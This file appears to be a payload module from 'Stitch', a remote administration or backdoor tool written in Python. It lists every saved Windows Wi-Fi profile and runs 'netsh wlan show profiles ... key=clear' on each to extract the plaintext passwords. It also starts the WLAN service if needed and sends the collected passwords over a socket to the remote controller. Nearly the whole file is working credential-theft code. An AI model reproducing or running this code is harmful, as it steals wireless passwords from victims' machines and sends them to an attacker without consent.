# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import re
import sys
import subprocess

def get_profiles():
    netsh_output = run_command("netsh wlan show profiles")
    if "not running" in netsh_output:
        net_wlan = run_command("net start wlansvc")
        if "started successfully" in net_wlan:
            netsh_output = run_command("netsh wlan show profiles")
        else:
            return net_wlan
    if "no wireless interface" in netsh_output:
        return netsh_output
    profiles=re.findall(': (.*)\r',netsh_output)
    passwd=''
    for x in profiles:
        if output := run_command(f'netsh wlan show profiles "{x}" key=clear'):
            passwd += f"\n{x}\n{output}\n\n"
    return passwd

resp=get_profiles()
send(client_socket,resp)
